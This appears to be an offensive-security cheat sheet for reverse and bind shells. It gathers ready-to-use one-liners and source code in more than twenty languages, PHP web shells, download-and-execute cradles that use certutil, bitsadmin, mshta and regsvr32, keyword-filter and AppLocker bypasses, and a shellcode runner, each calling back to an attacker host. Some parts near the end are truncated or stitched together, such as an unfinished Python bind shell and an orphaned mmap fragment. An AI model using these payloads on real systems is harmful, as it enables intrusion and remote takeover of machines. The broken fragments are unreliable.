title: Reverse Shells
html:
Reverse Shells

Interactive reference for reverse shell one-liners. Replace <lhost> and <lport> throughout.

Listener Setup

# Netcat (basic)
nc -lvnp <lport>

# Netcat with rlwrap (arrow keys + history)
rlwrap nc -lvnp <lport>

# Ncat (with SSL)
ncat --ssl -lvnp <lport>

# Socat (full TTY listener — use with socat PTY shell)
socat file:`tty`,raw,echo=0 TCP-LISTEN:<lport>

# pwncat-cs
pwncat-cs -lp <lport>

# Metasploit multi/handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST <lhost>; set LPORT <lport>; run"

TTY Upgrade

After catching a basic shell, upgrade to a full interactive TTY:

# Step 1 — spawn PTY (pick one)
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
script /dev/null -c bash
script -qc /bin/bash /dev/null

# Step 2 — background and fix
# Ctrl+Z
stty raw -echo; fg

# Step 3 — restore terminal
reset
export TERM=xterm-256color
export SHELL=bash
stty rows 38 columns 116

Bash

# /dev/tcp standard
bash -i >& /dev/tcp/<lhost>/<lport> 0>&1

# sh -c wrapper (avoids word-splitting in injection contexts)
sh -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'

# Background subshell
(bash -i >& /dev/tcp/<lhost>/<lport> 0>&1) &

# exec FD trick (no bash built-in redirect needed)
exec 5<>/dev/tcp/<lhost>/<lport>; cat <&5 | while read line; do $line 2>&5 >&5; done

# 196 FD trick
0<&196;exec 196<>/dev/tcp/<lhost>/<lport>; sh <&196 >&196 2>&196

# UDP
bash -i >& /dev/udp/<lhost>/<lport> 0>&1

# Named pipe (for environments without /dev/tcp)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <lhost> <lport> >/tmp/f

# Named pipe — sh variant
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <lhost> <lport> >/tmp/f

# Variable concatenation (bypass keyword filters)
ba''sh -i >& /dev/tcp/<lhost>/<lport> 0>&1

# IFS bypass (space filter)
IFS=,;cmd=bash,-i;$cmd>&/dev/tcp/<lhost>/<lport> 0>&1

Python

# Python3 — socket + dup2
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<lhost>",<lport>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Python3 — subprocess.call with fileno
python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("<lhost>",<lport>));subprocess.call(["/bin/bash","-i"],stdin=s,stdout=s,stderr=s)'

# Python3 — with PTY (fully interactive)
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("<lhost>",<lport>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# Python3 — create_connection short form
python3 -c 'import os,pty,socket;s=socket.create_connection(("<lhost>",<lport>));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/bash")'

# Python3 — threading (stable under load)
python3 -c '
import socket,subprocess
s=socket.socket()
s.connect(("<lhost>",<lport>))
p=subprocess.Popen(["/bin/bash","-i"],stdin=s,stdout=s,stderr=s)
p.wait()
'

# Python2 — socket + dup2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<lhost>",<lport>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python2 — os.popen
python -c 'import os;os.popen("bash -i >& /dev/tcp/<lhost>/<lport> 0>&1")'

# Python3 — Windows (cmd.exe)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<lhost>",<lport>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["cmd.exe"])'

# Python3 — pty.spawn only (TTY upgrade — run inside existing shell)
python3 -c 'import pty;pty.spawn("/bin/bash")'

PHP

# exec()
php -r '$sock=fsockopen("<lhost>",<lport>);exec("/bin/sh -i <&3 >&3 2>&3");'

# shell_exec()
php -r '$sock=fsockopen("<lhost>",<lport>);shell_exec("/bin/bash -i <&3 >&3 2>&3");'

# passthru()
php -r '$sock=fsockopen("<lhost>",<lport>);passthru("/bin/sh -i <&3 >&3 2>&3");'

# system()
php -r '$sock=fsockopen("<lhost>",<lport>);system("/bin/sh -i <&3 >&3 2>&3");'

# popen()
php -r '$sock=fsockopen("<lhost>",<lport>);popen("/bin/sh -i <&3 >&3 2>&3","r");'

# proc_open()
php -r '$s=fsockopen("<lhost>",<lport>);$p=proc_open("/bin/bash -i",array(0=>$s,1=>$s,2=>$s),$pipes);proc_close($p);'

# proc_open (full I/O loop)
php -r '$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$process=proc_open("/bin/bash -i",array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w")),$pipes);$sock=fsockopen("<lhost>",<lport>);while(!feof($sock)){$cmd=fgets($sock);$output=shell_exec($cmd);fwrite($sock,$output);}'

# PHP web shell — exec
<?php system($_GET['cmd']); ?>

# PHP web shell — passthru
<?php passthru($_GET['cmd']); ?>

# PHP web shell — shell_exec
<?php echo shell_exec($_GET['cmd']); ?>

# PHP web shell — backtick
<?php echo `$_GET[cmd]`; ?>

# PHP web shell — proc_open (full I/O, POST)
<?php $d=proc_open($_POST['c'],[['pipe','r'],['pipe','w'],['pipe','w']],$p);echo stream_get_contents($p[1]).stream_get_contents($p[2]);proc_close($d); ?>

# PHP file (upload and trigger)
<?php $sock=fsockopen("<lhost>",<lport>);$proc=proc_open("/bin/bash -i",array(0=>$s,1=>$s,2=>$s),$pipes); ?>

# Short tag reverse shell
<?php `bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'`; ?>

Perl

# Socket-based (bash)
perl -e 'use Socket;$i="<lhost>";$p=<lport>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# Socket-based (sh)
perl -e 'use Socket;$i="<lhost>";$p=<lport>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Without /bin/bash — via /dev/tcp
perl -e 'exec "/bin/bash -i >& /dev/tcp/<lhost>/<lport> 0>&1"'

# IO::Socket (no Socket import needed on some systems)
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<lhost>:<lport>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

# Windows Perl
perl -MIO::Socket -e '$c=IO::Socket::INET->new(PeerAddr,"<lhost>:<lport>");$_=<$c>;system$_;'

Ruby

# Socket-based — dup2 form
ruby -rsocket -e 'f=TCPSocket.open("<lhost>",<lport>).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'

# Compact — gets/popen loop
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<lhost>","<lport>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Shortest — string interpolation
ruby -rsocket -e 's=TCPSocket.new("<lhost>",<lport>);`/bin/sh -i <&#{s.to_i} >&#{s.to_i} 2>&#{s.to_i}`'

# Windows
ruby -rsocket -e 'c=TCPSocket.new("<lhost>","<lport>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

Java

# Runtime.exec() — bash via /dev/tcp
r = Runtime.getRuntime(); p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/<lhost>/<lport>;cat <&5 | while read line; do $line 2>&5 >&5; done"}); p.waitFor();

# ProcessBuilder
new ProcessBuilder(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/<lhost>/<lport> 0>&1"}).start().waitFor();

# Groovy/BeanShell eval context one-liner (Jenkins, etc.)
String host="<lhost>"; int port=<lport>; String cmd="/bin/bash"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);if(!p.isAlive()){s.close();break;}}

Golang

// Save as shell.go and run: go run shell.go
package main

import (
    "net"
    "os/exec"
)

func main() {
    c, _ := net.Dial("tcp", "<lhost>:<lport>")
    cmd := exec.Command("/bin/bash")
    cmd.Stdin = c
    cmd.Stdout = c
    cmd.Stderr = c
    cmd.Run()
}

# One-liner build and run
echo 'package main;import("net";"os/exec");func main(){c,_:=net.Dial("tcp","<lhost>:<lport>");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rs.go && go run /tmp/rs.go

# Windows variant
echo 'package main;import("net";"os/exec");func main(){c,_:=net.Dial("tcp","<lhost>:<lport>");cmd:=exec.Command("cmd.exe");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rs.go && go run /tmp/rs.go

Groovy

// Jenkins Script Console — Thread wrapper
Thread.start { ["bash", "-c", "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1"].execute() }

// Jenkins Script Console — full I/O
String host="<lhost>";
int port=<lport>;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    Thread.sleep(50);
    if(!p.isAlive()){s.close();break;}
}

// cmd.execute() shortcut
"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88bGhvc3Q+LzxscG9ydD4gMD4mMQ==}|{base64,-d}|bash".execute()

// Windows (cmd.exe)
String host="<lhost>";int port=<lport>;String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);if(!p.isAlive()){s.close();break;}}

Netcat

# Traditional nc with -e (bash)
nc <lhost> <lport> -e /bin/bash

# Traditional nc with -e (sh)
nc <lhost> <lport> -e /bin/sh

# OpenBSD nc (no -e) — mkfifo
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <lhost> <lport> >/tmp/f

# OpenBSD nc — alternate direction
rm -f /tmp/f; mkfifo /tmp/f; nc <lhost> <lport> < /tmp/f | /bin/bash 2>&1 > /tmp/f

# ncat
ncat <lhost> <lport> -e /bin/bash

# ncat with SSL
ncat --ssl <lhost> <lport> -e /bin/bash

# UDP
nc -u -e /bin/bash <lhost> <lport>

# Windows — nc.exe
nc.exe -e cmd.exe <lhost> <lport>

# Windows — ncat.exe (cmd)
ncat.exe <lhost> <lport> -e cmd.exe

# Windows — ncat.exe (powershell)
ncat.exe <lhost> <lport> -e powershell.exe

Socat

# Basic TCP
socat TCP:<lhost>:<lport> EXEC:/bin/bash

# Full PTY — fully interactive (run on target)
socat TCP:<lhost>:<lport> EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

# Full PTY listener on attacker (pair with above)
socat file:`tty`,raw,echo=0 TCP-LISTEN:<lport>

# SSL reverse shell (target)
socat OPENSSL:<lhost>:<lport>,verify=0 EXEC:/bin/bash

# SSL listener on attacker
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem
socat OPENSSL-LISTEN:<lport>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0

# UDP
socat UDP:<lhost>:<lport> EXEC:/bin/bash

# Windows (cmd)
socat TCP:<lhost>:<lport> EXEC:cmd.exe,pipes

# Windows (powershell)
socat TCP:<lhost>:<lport> EXEC:powershell.exe,pipes

PowerShell

# TCPClient — most reliable
$client = New-Object System.Net.Sockets.TCPClient('<lhost>',<lport>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# IEX download cradle — Invoke-PowerShellTcp
IEX (New-Object Net.WebClient).DownloadString('http://<lhost>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <lhost> -Port <lport>

# IEX generic cradle
IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/shell.ps1')

# ConPtyShell — fully interactive Windows PTY
IEX(IWR http://<lhost>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <lhost> <lport>

# From cmd.exe — bypass execution policy
powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "$client = New-Object System.Net.Sockets.TCPClient('<lhost>',<lport>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# -nop shorthand
powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('<lhost>',<lport>);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64-encoded payload generation (Linux side)
echo -n '$client=New-Object System.Net.Sockets.TCPClient("<lhost>",<lport>);$stream=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$stream.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$rb=([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($rb,0,$rb.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w0

# ConPtyShell listener on attacker
stty raw -echo; (stty size; cat) | nc -lvnp <lport>

PowerShell (Encoded)

# Generate base64 encoded PS command (Linux)
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://<lhost>/shell.ps1")' | iconv -t UTF-16LE | base64 -w0

# Run on Windows
powershell -EncodedCommand <base64output>

# Full TCPClient base64 (Python3 generator)
python3 -c "
import base64
cmd = '\$client=New-Object System.Net.Sockets.TCPClient(\"<lhost>\",<lport>);\$stream=\$client.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$stream.Read(\$b,0,\$b.Length))-ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+\"PS \"+(pwd).Path+\"> \";\$rb=([text.encoding]::ASCII).GetBytes(\$sb2);\$stream.Write(\$rb,0,\$rb.Length);\$stream.Flush()};\$client.Close()'
print(base64.b64encode(cmd.encode('utf-16-le')).decode())
"

Windows CMD

:: certutil download and execute
certutil.exe -urlcache -split -f http://<lhost>/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe

:: certutil download + PowerShell execute
certutil.exe -urlcache -split -f http://<lhost>/shell.ps1 C:\Windows\Temp\shell.ps1 && powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\shell.ps1

:: bitsadmin download and execute
bitsadmin /transfer job /download /priority high http://<lhost>/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe

:: bitsadmin multi-step
bitsadmin /create 1 & bitsadmin /addfile 1 http://<lhost>/shell.exe C:\Windows\Temp\shell.exe & bitsadmin /resume 1 & bitsadmin /complete 1 & C:\Windows\Temp\shell.exe

:: mshta (HTA payload)
mshta http://<lhost>/shell.hta

:: regsvr32 squiblydoo (AppLocker bypass)
regsvr32 /s /n /u /i:http://<lhost>/shell.sct scrobj.dll

:: wmic XSL (XSLT code exec)
wmic os get /format:"http://<lhost>/shell.xsl"

:: rundll32 JS eval
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/shell.ps1');")

:: curl (Win10+)
curl http://<lhost>/nc.exe -o C:\Temp\nc.exe && C:\Temp\nc.exe -e cmd.exe <lhost> <lport>

Awk

# GNU awk (gawk) — interactive loop
gawk 'BEGIN {s = "/inet/tcp/0/<lhost>/<lport>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

# awk — compact variant
awk 'BEGIN{s="/inet/tcp/0/<lhost>/<lport>";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'

Lua

# os.execute via bash /dev/tcp
lua -e "require('io');require('os');t=io.popen('uname -a');t:read('*a');os.execute('bash -c \"bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\"')"

# LuaSocket one-liner
lua5.1 -e 'local s=require("socket");local t=s.tcp();t:connect("<lhost>",<lport>);while true do local r=t:receive();local f=io.popen(r,"r");local x=f:read("*a");f:close();t:send(x) end'

# LuaSocket script
local socket = require("socket")
local tcp = socket.tcp()
tcp:connect("<lhost>", <lport>)
while true do
    local s, status, partial = tcp:receive()
    local f = io.popen(s, "r")
    local r = f:read("*a")
    f:close()
    tcp:send(r)
    if status == "closed" then break end
end
tcp:close()

Node.js

# net module — one-liner (Linux)
node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/bash",[]);var client=new net.Socket();client.connect(<lport>,"<lhost>",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'

# net module — Windows (cmd.exe)
node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("cmd.exe",[]);var client=new net.Socket();client.connect(<lport>,"<lhost>",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'

# Script form
var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/bash", []);
var client = new net.Socket();
client.connect(<lport>, "<lhost>", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
});

Telnet

# mkfifo + telnet (one connection)
rm -f /tmp/f; mkfifo /tmp/f; telnet <lhost> <lport> 0</tmp/f | /bin/bash 1>/tmp/f

# mktemp variant
TF=$(mktemp -u); mkfifo $TF && telnet <lhost> <lport> 0<$TF | /bin/bash 1>$TF

# Dual-port telnet (two listeners on attacker)
telnet <lhost> <lport> | /bin/bash | telnet <lhost> <lport>

Xterm

# Target — connect back to attacker display
xterm -display <lhost>:1

# Attacker — start virtual framebuffer and allow connections
Xvfb :1 -listen tcp &
xhost +<target-ip>

# Attacker — standard display export
DISPLAY=<lhost>:0.0 xterm

# Legacy form
xterm -display <lhost>:0.0

OpenSSL (Encrypted Shell)

# Step 1 — attacker: generate cert and start listener
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=<lhost>'
openssl s_server -quiet -key key.pem -cert cert.pem -port <lport>

# Step 2 — target: connect back (Linux)
rm /tmp/s; mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <lhost>:<lport> > /tmp/s; rm /tmp/s

# Alternate (no mkfifo)
openssl s_client -quiet -connect <lhost>:<lport>|/bin/sh|openssl s_client -quiet -connect <lhost>:<lport>

# Using socat + OpenSSL
socat OPENSSL:<lhost>:<lport>,verify=0 EXEC:/bin/bash

Bind Shells

Listener opens on the target; attacker connects inbound.

# Netcat bind (with -e)
# Target:
nc -lvnp <lport> -e /bin/bash
# Attacker:
nc <target-ip> <lport>

# Netcat bind (no -e, mkfifo)
# Target:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp <lport> >/tmp/f
# Attacker:
nc <target-ip> <lport>

# Socat bind — basic
# Target:
socat TCP-LISTEN:<lport>,reuseaddr,fork EXEC:/bin/bash
# Attacker:
socat - TCP:<target-ip>:<lport>

# Socat bind — full PTY
# Target:
socat TCP-LISTEN:<lport>,reuseaddr,fork EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
# Attacker:
socat file:`tty`,raw,echo=0 TCP:<target-ip>:<lport>

# Python3 bind
# Target:
python3 -c '
import socket,subprocess,os
s=socket.socket()
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

C

// Save as shell.c, compile: gcc shell.c -o shell && ./shell
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(void) {
    int s;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(<lport>);
    addr.sin_addr.s_addr = inet_addr("<lhost>");
    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&addr, sizeof(addr));
    dup2(s, 0); dup2(s, 1); dup2(s, 2);
    execve("/bin/sh", NULL, NULL);
    return 0;
}

C#

// Add-Type in PowerShell or compile with csc.exe
using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;

public class RShell {
    public static void Main() {
        var client = new TcpClient("<lhost>", <lport>);
        var stream = client.GetStream();
        var sr = new StreamReader(stream);
        var sw = new StreamWriter(stream) { AutoFlush = true };
        while (true) {
            string cmd = sr.ReadLine();
            if (cmd == null) break;
            var proc = new Process {
                StartInfo = new ProcessStartInfo("cmd.exe", "/c " + cmd) {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false
                }
            };
            proc.Start();
            sw.Write(proc.StandardOutput.ReadToEnd());
            sw.Write(proc.StandardError.ReadToEnd());
        }
    }
}

Rust

# Save as shell.rs, compile: rustc shell.rs -o shell && ./shell
cat > /tmp/shell.rs << 'EOF'
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

fn main() {
    let s = TcpStream::connect("<lhost>:<lport>").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
EOF
rustc /tmp/shell.rs -o /tmp/shell && /tmp/shell

Kotlin

// Save as shell.kts, run: kotlinc-jvm -script shell.kts
import java.net.Socket
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintWriter

val socket = Socket("<lhost>", <lport>)
val br = BufferedReader(InputStreamReader(socket.inputStream))
val pw = PrintWriter(socket.outputStream, true)
while (true) {
    val cmd = br.readLine() ?: break
    val proc = Runtime.getRuntime().exec(cmd)
    pw.println(proc.inputStream.bufferedReader().readText())
}

Dart

// dart shell.dart
import 'dart:io';

main() async {
  var socket = await Socket.connect('<lhost>', <lport>);
  Process process = await Process.start('/bin/sh', []);
  socket.listen((data) => process.stdin.add(data));
  process.stdout.listen((data) => socket.add(data));
  process.stderr.listen((data) => socket.add(data));
}

Vlang

// v run shell.v
import net
import os

fn main() {
    mut conn := net.dial_tcp('<lhost>:<lport>') or { exit(1) }
    for {
        line := conn.read_line()
        if line.len == 0 { break }
        result := os.execute(line.trim_space())
        conn.write_string(result.output) or {}
    }
}

import ctypes,mmap

m = mmap.mmap(-1,len(buf),mmap.MAP_SHARED|mmap.MAP_ANONYMOUS,mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)
m.write(buf)

// C runner — compile: gcc runner.c -o runner -z execstack && ./runner
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char buf[] = "\x90\x90"; // replace with shellcode

int main() {
    void *mem = mmap(NULL, sizeof(buf), PROT_READ|PROT_WRITE|PROT_EXEC,
                     MAP_ANON|MAP_PRIVATE, -1, 0);
    memcpy(mem, buf, sizeof(buf));
    ((void(*)())mem)();
    return 0;
}

Port Typical Use

8080 Alt HTTP
